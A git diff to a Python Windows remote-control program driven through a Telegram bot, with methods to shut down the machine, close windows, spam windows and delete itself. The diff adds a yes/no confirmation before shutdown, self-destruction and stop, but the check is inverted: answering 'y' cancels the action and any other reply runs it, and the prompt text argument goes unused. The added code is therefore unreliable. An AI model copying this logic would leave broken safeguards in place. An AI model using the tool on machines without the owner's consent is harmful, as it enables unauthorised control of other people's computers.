@@ -2,7 +2,7 @@
 WARNINGS:
 This code is meant only to run on Windows 10/11 (7 and 8 probably work as well), the original project was to make it cross platform but then I realized it was too much work, sorry Linux.
 This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
-If you lose control of your telegram bot, you could potentially lose the control of t YOUR OWN MACHINE.
+If you lose control of your telegram bot, you could potentially lose the control of YOUR OWN MACHINE.
 
 ~Riccardo Zappitelli
 """
@@ -970,6 +970,9 @@ class PeppinoTelegram:
         press_key('f4')
         release_key('f4')
         release_key('alt')
+
+    def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
+        return self.send_prompt("Confirm").lower() == "y"
 
     def breath(self) -> None:
         self.__play_loaded_sound("breath")
@@ -2077,6 +2080,9 @@ class PeppinoTelegram:
         self.restore_wallpaper()
 
     def selfdestruction(self) -> None:
+        if self.ask_yesno():
+            self.bsend("Operation stopped.")
+            return
         current_file = realpath(sys.argv[0])
         temp_dir = gettempdir()
         if iswindows:
@@ -2104,6 +2110,9 @@ class PeppinoTelegram:
             self.bsend(f"Error while trying to show image: \n{e}")
 
     def shutdown(self, seconds=0) -> None:
+        if self.ask_yesno():
+            self.bsend("Operation stopped.")
+            return
         system(f"shutdown -s -t {seconds}")
 
     def spam_windows(self, n: int, text: str) -> None:
@@ -2219,6 +2228,9 @@ class PeppinoTelegram:
                 self.running = False
 
     def stop(self) -> None:
+        if self.ask_yesno():
+            self.bsend("Operation stopped.")
+            return
         self.running = False
         self.clear()
         self.bsend("🛑 Interrupted by you, bye bye.")
